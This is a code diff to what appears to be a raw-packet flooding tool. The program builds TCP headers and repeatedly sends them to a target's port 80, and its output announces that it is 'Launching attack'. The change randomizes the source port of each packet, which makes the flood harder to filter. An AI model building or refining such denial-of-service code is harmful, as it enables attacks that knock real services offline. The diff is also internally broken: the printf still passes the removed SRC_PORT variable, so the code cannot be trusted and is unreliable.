@@ -4,7 +4,6 @@ using namespace std;
 
 char SRC_IP[IP_SIZE];
 char DST_IP[IP_SIZE];
-unsigned short SRC_PORT = get_rand();
 unsigned short DST_PORT = 80;
 
 int main(int argc, char **argv)
@@ -50,7 +49,7 @@ int main(int argc, char **argv)
 
     if(strlen(SRC_IP) > 0 && strlen(DST_IP) > 0)
     {
-        printf("Launching attack to %s:%d from %s:%d every %d ms", DST_IP, DST_PORT, SRC_IP, SRC_PORT, sleep_time);
+        printf("Launching attack to %s:%d from %s every %d ms\n", DST_IP, DST_PORT, SRC_IP, SRC_PORT, sleep_time);
         exploit(sleep_time, packet_to_send);
     }
     else
@@ -146,7 +145,7 @@ void fill_tcp_opt(TCPOPT* tcp_opt)
 
 void fill_tcp_header(TCPHDR *tcp_header, TCPOPT* tcp_opt)
 {
-    tcp_header->source = htons(SRC_PORT);
+    tcp_header->source = htons(get_rand());
     tcp_header->dest = htons(DST_PORT);
     tcp_header->seq = 0;
     tcp_header->ack_seq = 0;
